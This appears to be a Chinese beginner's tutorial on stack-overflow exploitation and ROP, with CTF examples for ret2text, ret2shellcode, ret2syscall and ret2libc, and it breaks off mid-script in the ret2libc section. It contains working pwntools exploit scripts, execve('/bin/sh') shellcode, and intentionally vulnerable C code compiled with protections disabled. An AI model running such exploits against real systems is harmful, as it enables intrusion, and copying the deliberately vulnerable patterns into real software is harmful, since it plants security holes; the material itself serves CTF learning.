本文为笔者初学pwn的知识梳理，如有错误之处，敬请斧正。
* * *
### 栈溢出漏洞
#### 原理
栈是一种后进先出的数据结构。在调用函数的时候，都会伴随着函数栈帧的开辟和还原（也称平栈）。栈结构示意图如下（以32位程序为例）：  
如图所示，栈空间是从高地址向低地址增长的。但是，若函数中用到了数组作为局部变量时，向数组的赋值时的增长方向是从低地址到高地址的，与栈的增长方向相反。若对未限制数组的赋值边界，则可能对数组进行恶意的越界写入，便会把栈中的数据覆盖，造成栈溢出漏洞。常用的造成栈溢出漏洞的函数有：scanf,gets,strcpy,strcat,sprintf等。  
如果对覆盖栈的内容进行精心构造，就可以在返回地址的位置填入我们希望函数返回的位置，从而劫持程序的执行。由于在编写栈利用 shellcode
过程中都需要用到ret指令，所以这样的利用方式被成为ROP。
#### 面对返回编程
ROP(Return-oriented programming)是指面向返回编程。在32位系统的汇编语言中，ret相当于pop EIP，即将栈顶的数据赋值给
EIP，并从栈弹出。所以如果控制栈中数据，是可以控制程序的执行流的。由于 NX 保护让我们无法直接执行栈上的
shellcode，那么就可以考虑在程序的可执行的段中通过 ROP 技术执行我们的 shellcode。初级的 ROP 技术包括
ret2text，ret2shellcode，ret2syscall，ret2libc。
#### ret2text
ret2text是指返回到代码段执行已有的代码。在 pwn 题中这种情况通常出现在程序里已经有system("/bin/sh")或system("cat
flag")。需要做的就是把这些调用的地址覆盖到返回地址处即可。  
下面使用攻防世界中的 level0 题目作为例子进行解释。  
checksec 指令查看程序的保护情况，有 NX 保护（No-eXecute，即数据不可执行保护）。考虑使用 ROP 技术进行利用。  
漏洞代码：  
可以看到，read函数可以读取0x200字节存入缓冲区，但是缓冲区只有0x80字节，可造成越界写入。  
system 函数：  
使用 pwndgb 插件的 cyclic 指令确定出返回的偏移为
136，所以构造填充字符大小为136个字节，后面紧接的便是返回的地址。控制这个返回的地址即可控制程序的执行流执行到我们指定的 system 函数。  
EXP如下：
    from pwn import *
    r = remote("111.200.241.244", 57216)
    payload = 'A' * 136 + p64(0x00400596)
    r.sendlineafter("Hello, World\n", payload)
    r.interactive()
在本地调试时执行脚本后可以看到，在执行vulnerable_function执行返回时， 0x88(136) 的位置已经被修改为system函数的地址。  
#### ret2shellcode
如果 pwn 题中没有提供system函数，我们可以自己编写 shellcode 来执行相关 system 函数。  
在没有 NX 保护的情况下，可以直接将函数的返回地址覆盖为 shellcode 的地址，在函数返回时控制程序执行流到 shellcode 出执行。被覆盖
shellcode 后的栈空间的形态如下图所示（图中只展示一种 shellcode 的位置，但实际上可以根据具体情况选择）：  
其中 padding 的长度可以使用 pwndbg 插件 中的 cyclic或者 peda 插件
pattern指令生成字符串模板并结合动态调试观察栈来确定。在 pwn 题目中，我们一般可以通过找到system函数地址，通过 shellcode
调用执行，就可以拿到 flag。所以在写 shellcode 过程中，我们按照 linux
系统调用的方式调用system函数的底层的sys_execve函数，传入/bin/sh作为参数即可。shellcode 可以使用 pwntools
工具编写，若需要更精简或特殊定制的
shellcode，也可以自己编写。具体的编写方式可以参考博客
shellcode 之后需要进行字符的填充，使其保证具有足够的字节数覆盖到返回地址处。  
我们用以下例子进行演示说明：
    #include
    void func(){
        asm("jmp *%rsp");
    }
    int main()
    {
        char buf[200];
        printf("what do you want? ");
        gets(buf);
        puts(buf);
        return 0;
    }
编译注意禁用所有保护：
    gcc -no-pie -fno-stack-protector -zexecstack -o ret2shellcode ret2shellcode.c
从源码中可以看出在栈的buf字符数组处有溢出，并且有后门指令进行利用。然后设计 payload 如下面 exp 所示，目的是将 jmp_rsp 的指令填充到
main 函数返回地址中，从而控制程序执行。"A" * 0xd8是填充字符，目的是为了对齐 shellcode 到 rsp 的地址上。  
exp：
    from pwn import *
    context(arch="amd64",os="linux",log_level="debug")
    p = process("./ret2shellcode")
    elf = ELF("./ret2shellcode")
    jmp_esp = elf.search(asm('jmp rsp')).next()
    shellcode = asm(shellcraft.sh())
    payload = "A" * 0xd8 + p64(jmp_esp) + shellcode 
    p.sendline(payload)
    p.interactive()
#### ret2syscall
在ret2shellcode的例子中，若开始了 NX 保护，写入到栈中的 shellcode
将不可执行。在这种情况下，我们可以尝试使用ret2syscall的方法。ret2syscall是指通过收集带有ret指令的 gadgets(指令片段)
拼接成我们所需要的 shellcode。在此先贴出32位下的调用execve("/bin/sh",NULL,NULL)的 shellcode（涉及
Linux 系统调用方式不清楚可自行搜索）：
    // 字符串：/bin//sh
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    // ebx ecx edx 传参
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    // eax = 系统调用号
    push 11
    pop eax
    // Linux 系统调用
    int 0x80
然后我们可以通过ROPgadget命令来找到程序中是否有对应上面指令的 gadgets：
    ROPgadget --binary ./ret2syscall --string /bin/sh
    ROPgadget --binary ./ret2syscall --only "pop|pop|pop|ret"|grep "edx"|grep "ebx"|grep "ecx"
    ROPgadget --binary ./ret2syscall --only "pop|ret"|grep eax
    ROPgadget --binary ./ret2syscall --only "int"|grep "0x80"
我们以 Github 上ctf-wiki项目中的题目来举例，项目地址是
源码如下，明显的栈溢出漏洞：
    #include 
    #include 
    char *shell = "/bin/sh";
    int main(void)
    {
        setvbuf(stdout, 0LL, 2, 0LL);
        setvbuf(stdin, 0LL, 1, 0LL);
        char buf[100];
        printf("This time, no system() and NO SHELLCODE!!!\n");
        printf("What do you plan to do?\n");
        gets(buf);
        return 0;
    }
查看保护发现只有 NX 保护，手动查看对应 gadgets 的地址：  
利用思路：将收集到的 gadgets 按照顺序组合成 payload。payload 发送后缓冲区的情况如图所示，箭头指向是指程序以 ret 导向的执行流。  
最终EXP如下：
    from pwn import *
    p = process("./ret2syscall")
    pop_eax = p32(0x080bb196)
    pop_edx_ecx_ebx = p32(0x0806eb90)
    bin_sh = p32(0x080be408)
    int_0x80 = p32(0x08049421)
    offset = 112
    payload=flat(['a'*offset, pop_eax, 0xb, pop_edx_ecx_ebx, 0, 0, bin_sh,int_0x80])
    p.sendline(payload)
    p.interactive()
#### ret2libc
如果程序中没有后门，开启了 NX 保护，没有足够的 gadgets 来构造
shellcode，那么以上的方法都没办法使用，可以使用一种更复杂，限制更小的利用方式ret2libc。ret2libc是指将程序返回 libc，直接调用
libc 的函数。所以首先需要获取到 libc 中函数的地址。同一版本 libc 的偏移相对 libc 基址是确定的。如果需要调用 libc
的函数，就需要确定 libc 的基址和函数偏移。函数偏移可以通过在文件中的偏移得出，知道了 libc 版本则可以认为是已知的。但是 libc
的加载基址是随机加载的，所以需要先确定 libc 的加载基址。  
获取 libc 的加载基址的方法：从程序 got 表中获取到函数的实时地址，减去相应版本的 libc
中函数在文件中的偏移，即可知道libc的基址（这里涉及PLT表和GOT表的相关知识，可以查看  
因此，我们的思路是，只需要泄露出一个函数的地址，就通过LibcSearcher(
libc 版本。然后计算某个函数的实时地址和对应 libc 中的这个函数地址的偏移，可以计算出 libc 加载基址。通过 libc
基址，加上需要调用的函数（通常为system函数）在 libc 中的偏移，就可以知道当前所需函数的地址。  
以攻防世界题目 pwn-100 进行举例说明：  
程序分析：read 函数可以导致栈溢出，只有读取到200个字符才会退出循环。但是缓冲区是只有64字节的。  
利用思路：利用read函数的栈溢出漏洞，调用到puts函数将read函数的 got
地址泄露出来。接着将程序重新导回到main函数重新执行，制造二次溢出。获取到read的 got 地址之后，即可使用LibcSearcher项目获取到
libc 的版本。获取到 libc 版本之后通过计算得出system函数的地址。接着二次溢出时就可以调用system函数获取到 shell。  
EXP如下：
    from pwn import *